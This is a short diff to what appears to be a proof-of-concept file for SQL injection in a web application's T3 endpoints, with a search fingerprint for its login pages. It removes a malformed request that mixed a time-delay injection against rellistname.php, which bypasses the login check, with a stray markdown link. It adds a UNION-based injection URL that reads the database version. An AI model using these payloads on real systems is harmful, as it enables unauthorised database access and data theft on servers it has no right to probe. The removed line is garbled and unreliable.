@@ -11,7 +11,5 @@ body="/mlogin.htm?url=" || body="T3/MAIN/Login.aspx"
 ## poc
 
 ```javascript
-[GET /config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:4'--+- HTTP/1.1
-Host: 
-Cookie: PHPSESSID=bgsesstimeout-;](http://ip/T3/Ajax/Ajax_CheckMobileRepeat.ashx?action=checkmobilerepeat&mobileNum=1%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20%40%40version%29--%20aEdt)
+http://ip/T3/Ajax/Ajax_CheckMobileRepeat.ashx?action=checkmobilerepeat&mobileNum=1%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20%40%40version%29--%20aEdt
 ```
